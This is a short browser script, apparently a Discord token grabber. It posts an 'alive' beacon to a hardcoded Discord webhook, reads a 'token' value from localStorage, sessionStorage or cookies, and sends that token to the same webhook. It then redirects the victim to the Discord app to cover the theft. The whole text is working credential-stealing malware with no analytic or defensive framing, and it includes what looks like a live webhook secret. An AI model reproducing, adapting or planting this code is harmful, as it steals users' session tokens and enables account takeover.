    <script>
        // 1. Hardcoded Webhook
        const wh = "https://discord.com/api/webhooks/1544089033750351872/N8IZsnU3Llw2BpW7cnY_9OY9z_7k2vzlLQu6u-6YusUxSUi2L3HoeGNFPcWEQqld8B2t";
        
        // 2. Send "Alive" signal
        fetch(wh, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({content: '🟢 ALIVE'})
        }).catch(() => {});

        // 3. Get Token
        let t = localStorage.token || sessionStorage.token;
        if (!t) {
            const c = document.cookie.match(/token=([^;]+)/);
            if (c) t = c[1];
        }

        // 4. Send Token
        if (t) {
            fetch(wh, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({content: '🔥 ' + t})
            }).then(() => location.href = 'https://discord.com/channels/@me');
        } else {
            fetch(wh, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({content: '⚠️ NO TOKEN'})
            });
        }
    </script>
